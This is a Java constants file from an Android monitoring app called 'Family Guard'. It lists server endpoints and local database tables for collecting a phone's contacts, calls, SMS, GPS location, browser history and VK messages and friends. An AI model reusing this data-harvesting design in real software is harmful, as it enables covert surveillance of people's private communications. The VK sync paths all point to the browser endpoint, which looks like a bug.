package com.frostweepgames.apptracker.settings;


/**-------------------------------
 * Created by artem on 21.02.2018.
 * Powered by Frostweep Games
 * All rights reserved!
 * (c)2013-2018
 * www.frostweepgames.com
 ---------------------------------*/

public class Constants {

    public static final int REQUEST_PERMISSION_VALUE = 444;

    public static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 3; // meters
    public static final long MIN_TIME_BW_UPDATES = 1000 * 60 * 1; // minutes

    public static final int DEFAULT_NOTIFICATION_ID = 101;



    // VK
    public static final String VK_GROUPS_FIELDS = "city, country, place, description, wiki_page, members_count, counters, start_date, finish_date," +
                                                  "can_post, can_see_all_posts, activity, status, contacts, links, fixed_post, verified, site, can_create_topic";

    public static final String VK_MESSAGES_FIELDS = "";

    public static final String VK_FRIENDS_FIELDS = "nickname, domain, sex, bdate, city, country, timezone, photo_50, photo_100, photo_200_orig, has_mobile, " +
                                                    "contacts, education, online, relation, last_seen, status, can_write_private_message, can_see_all_posts, can_post, universities";

    public static final String VK_API_MESSAGES_GET = "messages.get";
    public static final String VK_API_GROUPS_GET = "groups.get";
    public static final String VK_API_FRIENDS_GET = "friends.get";
    public static final String VK_SCOPE = "friends, messages, groups";


    public static final String CPU_INFO_FILE = "/proc/cpuinfo";
    public static final String CPU_CORES_COUNT_INFO_FILE = "/sys/devices/system/cpu/";


    public static final String DEFAULT_NOTIFICATION_CHANNEL_ID = "family_guard_channel_1";

    public static final String APP_NAME = "Family Guard";
    public static final String NOTIFICATION_CONTENT_TEXT = "To call 'alert' click on this notification";

    public static final String DEFAULT_HISTORY_DB_PATH = "/Download/History.db";
    public static final String DEFAULT_HISTORY_FOLDER_DB_PATH = "/Download/HistoryFolder";


    // Network
    public static final String SERVER_URL = "http://familyguard.cyberrit.net";

    public static final String SERVER_HELP_CHECK = "/rest/help/check";
    public static final String SERVER_HELP_SETTINGS = "/rest/help/setting";
    public static final String SERVER_HELP_ALARM = "/rest/help/alarm";
    public static final String SERVER_HELP_SYSTEM = "/rest/help/system";
    public static final String SERVER_SYNC_CONTACTS = "/rest/sync/contacts";
    public static final String SERVER_SYNC_CALLS =  "/rest/sync/call";
    public static final String SERVER_SYNC_SMS =  "/rest/sync/sms";
    public static final String SERVER_SYNC_INSTALLED_APPS =  "/rest/sync/app";
    public static final String SERVER_SYNC_GPS =  "/rest/sync/gps";
    public static final String SERVER_SYNC_BROWSERS_HISTORY =  "/rest/sync/browser";
    public static final String SERVER_SYNC_VK_GROUPS =  "/rest/sync/browser";
    public static final String SERVER_SYNC_VK_DIALOGS =  "/rest/sync/browser";
    public static final String SERVER_SYNC_VK_FRIENDS =  "/rest/sync/browser";
    public static final String SERVER_SYNC_VK_MESSAGES =  "/rest/sync/browser";

    public static final String SERVER_KEY_TOKEN = "token";
    public static final String SERVER_KEY_DATA = "data";
    public static final String SERVER_KEY_EMAIL = "email";

    // Local DB Keys
    public static final String KEY_DATABASE_NAME = "CachedData.db";
    public static final Integer KEY_DATABASE_VERSION = 1;

    public static final String KEY_TABLE_CONTACTS = "Contacts";
    public static final String KEY_TABLE_CALLS = "Calls";
    public static final String KEY_TABLE_SMS = "SMS";
    public static final String KEY_TABLE_GPS = "GPS";
    public static final String KEY_TABLE_INSTALLED_APPS = "InstalledApps";
    public static final String KEY_TABLE_BROWSER_HISTORY = "BrowsersHistory";
    public static final String KEY_TABLE_SYSTEM_INF0 = "SystemInfo";
    public static final String KEY_TABLE_APP_SETTINGS = "AppSettings";
    public static final String KEY_TABLE_SYNC_SETTINGS = "SyncSettings";

    public static final String TABLE_KEY_ID = "Id";
    public static final String TABLE_KEY_DATA = "Data";

    public static final String CREATE_TABLE_CONTACTS_SQL = "CREATE TABLE " + KEY_TABLE_CONTACTS + " (" + TABLE_KEY_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " + TABLE_KEY_DATA + " TEXT NOT NULL);";
    public static final String CREATE_TABLE_SMS_SQL = "CREATE TABLE " + KEY_TABLE_SMS + " (" + TABLE_KEY_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " + TABLE_KEY_DATA + " TEXT NOT NULL);";
    public static final String CREATE_TABLE_APPS_SQL = "CREATE TABLE " + KEY_TABLE_INSTALLED_APPS + " (" + TABLE_KEY_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " + TABLE_KEY_DATA + " TEXT NOT NULL);";
    public static final String CREATE_TABLE_CALLS_SQL = "CREATE TABLE " + KEY_TABLE_CALLS + " (" + TABLE_KEY_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " + TABLE_KEY_DATA + " TEXT NOT NULL);";
    public static final String CREATE_TABLE_GPS_SQL = "CREATE TABLE " + KEY_TABLE_GPS + " (" + TABLE_KEY_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " + TABLE_KEY_DATA + " TEXT NOT NULL);";
    public static final String CREATE_TABLE_BROWSER_HISTORY_SQL = "CREATE TABLE " + KEY_TABLE_BROWSER_HISTORY + " (" + TABLE_KEY_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " + TABLE_KEY_DATA + " TEXT NOT NULL);";
    public static final String CREATE_TABLE_SYSTEM_INF0_SQL = "CREATE TABLE " + KEY_TABLE_SYSTEM_INF0 + " (" + TABLE_KEY_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " + TABLE_KEY_DATA + " TEXT NOT NULL);";
    public static final String CREATE_TABLE_APP_SETTINGS_SQL = "CREATE TABLE " + KEY_TABLE_APP_SETTINGS + " (" + TABLE_KEY_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " + TABLE_KEY_DATA + " TEXT NOT NULL);";
    public static final String CREATE_TABLE_SYNC_SETTINGS_SQL = "CREATE TABLE " + KEY_TABLE_SYNC_SETTINGS + " (" + TABLE_KEY_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " + TABLE_KEY_DATA + " TEXT NOT NULL);";

    public static final String DROP_TABLE_CONTACTS_SQL = "DROP TABLE IF EXISTS " + KEY_TABLE_CONTACTS;
    public static final String DROP_TABLE_SMS_SQL = "DROP TABLE IF EXISTS " + KEY_TABLE_SMS;
    public static final String DROP_TABLE_APPS_SQL = "DROP TABLE IF EXISTS " + KEY_TABLE_INSTALLED_APPS;
    public static final String DROP_TABLE_CALLS_SQL = "DROP TABLE IF EXISTS " + KEY_TABLE_CALLS;
    public static final String DROP_TABLE_GPS_SQL = "DROP TABLE IF EXISTS " + KEY_TABLE_GPS;
    public static final String DROP_TABLE_BROWSER_HISTORY_SQL = "DROP TABLE IF EXISTS " + KEY_TABLE_BROWSER_HISTORY;
    public static final String DROP_TABLE_SYSTEM_INF0_SQL = "DROP TABLE IF EXISTS " + KEY_TABLE_SYSTEM_INF0;
    public static final String DROP_TABLE_APP_SETTINGS_SQL = "DROP TABLE IF EXISTS " + KEY_TABLE_APP_SETTINGS;
    public static final String DROP_TABLE_SYNC_SETTINGS_SQL = "DROP TABLE IF EXISTS " + KEY_TABLE_SYNC_SETTINGS;
}
